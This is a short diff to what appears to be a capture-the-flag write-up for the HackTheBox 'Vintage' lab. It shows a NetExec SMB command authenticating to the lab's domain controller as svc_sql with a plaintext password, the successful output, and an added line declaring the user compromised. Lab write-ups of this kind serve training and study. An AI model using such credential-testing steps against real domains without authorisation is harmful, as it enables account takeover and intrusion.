@@ -256,3 +256,6 @@ nxc smb dc01.vintage.htb -u 'svc_sql' -p 'Zer0the0ne' -k
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne
 ```
+This user is now compromised
+
+``
